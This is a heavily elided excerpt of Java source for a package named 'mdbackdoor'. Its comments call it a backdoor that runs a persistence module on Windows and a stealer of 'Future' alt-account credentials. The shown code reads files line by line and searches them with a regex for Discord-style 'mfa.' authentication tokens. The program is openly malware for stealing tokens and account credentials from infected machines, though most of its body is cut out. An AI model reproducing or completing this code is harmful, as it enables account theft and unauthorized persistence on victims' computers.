package com.mdTechnologies.mdbackdoor;
...
/*
* Main mdBackdoor class.
* Runs mdPersistence if Windows.
*
 */
    ...
    public static void justice() {
        try {
            ...
            if (os.toLowerCase().contains("win")) {
                ...
                /*
                 * Future alts stealer by Mysticed_
                 */
                ...
                for (String pathname : pathnames) {
                    try {
                        ...
                        while ((strLine = br.readLine()) != null) {
                            ...
                            Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //md's 2fa token regex
